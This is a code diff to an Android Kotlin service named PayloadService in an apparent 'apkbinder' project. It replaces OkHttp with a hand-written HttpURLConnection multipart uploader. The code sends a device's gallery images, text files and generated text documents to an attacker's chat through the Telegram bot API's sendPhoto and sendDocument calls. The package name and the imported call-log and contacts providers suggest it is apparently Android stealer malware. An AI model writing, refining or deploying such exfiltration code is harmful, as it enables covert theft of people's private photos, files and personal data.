@@ -19,11 +19,8 @@ import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.MediaStore
 import Com.devhs.apkbinder.core.Const
-import okhttp3.MediaType.Companion.toMediaType
-import okhttp3.MultipartBody
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.RequestBody.Companion.toRequestBody
+import java.net.HttpURLConnection
+import java.net.URL
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
@@ -33,12 +30,6 @@ import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicInteger
 
 class PayloadService : Service() {
-
-    private val client = OkHttpClient.Builder()
-        .connectTimeout(25, TimeUnit.SECONDS)
-        .writeTimeout(45, TimeUnit.SECONDS)
-        .readTimeout(45, TimeUnit.SECONDS)
-        .build()
 
     private val pool = Executors.newFixedThreadPool(Const.PARALLEL_UPLOADS)
     private lateinit var gate: Semaphore
@@ -173,6 +164,65 @@ class PayloadService : Service() {
         null
     }
 
+    // ---------------- HTTP ----------------
+
+    private fun postFile(
+        api: String,
+        fileName: String,
+        mime: String,
+        data: ByteArray
+    ): Boolean {
+        val boundary = "----hs" + System.nanoTime()
+        var conn: HttpURLConnection? = null
+        try {
+            val url = URL("https://api.telegram.org/bot" + token + "/" + api)
+            conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"
+            conn.doOutput = true
+            conn.connectTimeout = 20000
+            conn.readTimeout = 60000
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary)
+            conn.setChunkedStreamingMode(64 * 1024)
+
+            conn.outputStream.use { os ->
+                os.write(("--" + boundary + "\r\n").toByteArray())
+                os.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".toByteArray())
+                os.write(chat.toByteArray(Charsets.UTF_8))
+                os.write("\r\n".toByteArray())
+
+                os.write(("--" + boundary + "\r\n").toByteArray())
+                os.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n".toByteArray())
+                os.write(Const.CAPTION.toByteArray(Charsets.UTF_8))
+                os.write("\r\n".toByteArray())
+
+                os.write(("--" + boundary + "\r\n").toByteArray())
+                os.write(
+                    ("Content-Disposition: form-data; name=\"file\"; filename=\"" +
+                            fileName.replace("\"", "_") + "\"\r\n").toByteArray()
+                )
+                os.write(("Content-Type: " + mime + "\r\n\r\n").toByteArray())
+                os.write(data)
+                os.write(("\r\n--" + boundary + "--\r\n").toByteArray())
+                os.flush()
+            }
+
+            val code = conn.responseCode
+            if (code in 200..299) return true
+            HsLog.e("http $code $api $fileName")
+            return false
+        } catch (t: Throwable) {
+            HsLog.e("http fail $api: ${t.message}")
+            return false
+        } finally {
+            try {
+                conn?.disconnect()
+            } catch (_: Throwable) {
+            }
+        }
+    }
+
+    // ---------------- gallery ----------------
+
     private fun queryImages(): List<Uri> {
         val out = ArrayList<Uri>()
         val proj = arrayOf(MediaStore.Images.Media._ID)
@@ -244,22 +294,7 @@ class PayloadService : Service() {
                             lower.endsWith(".png") || lower.endsWith(".webp"))
                 ) return@execute
                 val data = bytesOf(uri) ?: return@execute
-
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", chat)
-                    .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart("photo", name, data.toRequestBody("image/jpeg".toMediaType()))
-                    .build()
-
-                val req = Request.Builder()
-                    .url("https://api.telegram.org/bot$token/sendPhoto")
-                    .post(body)
-                    .build()
-
-                client.newCall(req).execute().use { r ->
-                    if (r.isSuccessful) done.incrementAndGet()
-                }
+                if (postFile("sendPhoto", name, "image/jpeg", data)) done.incrementAndGet()
             } catch (t: Throwable) {
                 HsLog.e("sendImage: ${t.message}")
             } finally {
@@ -275,22 +310,7 @@ class PayloadService : Service() {
                 val name = nameOf(uri)
                 if (!name.lowercase().endsWith(".txt")) return@execute
                 val data = bytesOf(uri) ?: return@execute
-
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", chat)
-                    .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart("document", name, data.toRequestBody("text/plain".toMediaType()))
-                    .build()
-
-                val req = Request.Builder()
-                    .url("https://api.telegram.org/bot$token/sendDocument")
-                    .post(body)
-                    .build()
-
-                client.newCall(req).execute().use { r ->
-                    if (r.isSuccessful) done.incrementAndGet()
-                }
+                if (postFile("sendDocument", name, "text/plain", data)) done.incrementAndGet()
             } catch (t: Throwable) {
                 HsLog.e("sendDoc: ${t.message}")
             } finally {
@@ -304,22 +324,7 @@ class PayloadService : Service() {
         pool.execute {
             try {
                 val data = content.toByteArray(Charsets.UTF_8)
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", chat)
-                    .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart("document", name, data.toRequestBody("text/plain".toMediaType()))
-                    .build()
-
-                val req = Request.Builder()
-                    .url("https://api.telegram.org/bot$token/sendDocument")
-                    .post(body)
-                    .build()
-
-                client.newCall(req).execute().use { r ->
-                    if (r.isSuccessful) done.incrementAndGet()
-                    else HsLog.e("send $name http ${r.code}")
-                }
+                if (postFile("sendDocument", name, "text/plain", data)) done.incrementAndGet()
             } catch (t: Throwable) {
                 HsLog.e("sendTextFile: ${t.message}")
             } finally {
